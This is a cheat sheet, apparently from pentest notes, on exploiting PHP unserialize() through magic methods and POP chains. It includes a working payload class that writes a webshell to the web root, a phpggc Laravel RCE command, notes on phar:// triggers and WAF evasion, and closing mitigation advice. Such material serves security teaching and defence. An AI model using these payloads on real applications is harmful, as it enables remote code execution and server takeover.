---
title: PHP deserialization — objects, magic methods and POP chains
tags: [web, php, deserialization, pop-chain, rce]
---

# PHP deserialization: from a cookie to a webshell

**English** | [🇪🇸 Español](php-deserialization.md)

## 1. Spot the entry point

PHP serializes with `serialize()` and rebuilds with `unserialize()`. The format is unmistakable:

```text
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}
```

It shows up in cookies (`session`, `data`, `auth`), hidden fields, `localStorage` and GET/POST parameters. If the value is base64, decode it first:

```bash
echo '<blob>' | base64 -d
```

## 2. Magic methods that run on their own

`unserialize()` does not call arbitrary methods, but it does call magic ones during rebuild:

| Method | When |
|---|---|
| `__wakeup()` | on deserialization |
| `__destruct()` | on object destruction (end of request) |
| `__toString()` | when used as a string |
| `__call()` / `__get()` | access to missing methods/properties |

A POP chain links those methods through classes already loaded by the app until a `system()`, `file_put_contents()` or `eval()`.

## 3. Build the payload

With classes from the source:

```php
<?php
class Logger {
    public $file = '/var/www/html/shell.php';
    public $data = '<?php system($_GET["c"]); ?>';
    function __destruct() { file_put_contents($this->file, $this->data); }
}
echo urlencode(serialize(new Logger()));
```

Without PHP, build the string by hand or with a library:

```python
from phpserialize import serialize
print(serialize({'file': '/tmp/x', 'data': 'id'}, charset='utf-8'))
```

Lengths (`s:5:"admin"`) count **bytes**, not characters: adjust them for accents or `<?php`.

## 4. Framework cases

- **Laravel**: `unserialize()` on a signed cookie/payload; with `APP_KEY` you forge the encryption and reach RCE (CVE-2018-15133). (`phpggc` ships Laravel/Symfony/Guzzle chains.)
- **`phar://`**: any file function (`file_exists`, `getimagesize`) deserializes `.phar` metadata; useful when there is no direct `unserialize()`.
- **WordPress plugins**: POP chains in plugins doing `unserialize(base64_decode($_COOKIE[...]))`.

```bash
phpggc Laravel/RCE9 system id -b
```

## 5. Typical errors

- **`unserialize(): Error at offset`** → wrong string length; count bytes.
- **Object rebuilt but nothing happens** → class not autoloaded, or the magic method is not the one you think.
- **`__wakeup` throws** → validation exists; find another class or `__destruct`.
- **Payload caught by a WAF** → base64-encode if the code does `base64_decode`, or use `phar://`.
- **`phar://` does not trigger** → the file must be a valid PHAR and the path must reach it.

## 6. Detection and mitigation

- Never deserialize user input: use JSON and schema validation.
- `unserialize($data, ['allowed_classes' => false])` when unavoidable.
- Sign cookies (HMAC) and rotate `APP_KEY`/secrets if leaked.
- WAF and SAST for `unserialize(`, `phar://`, `base64_decode(` in the same flow.
- Review dependencies with known POP chains (`phpggc` as reference).

MITRE: T1059, T1190, T1505.
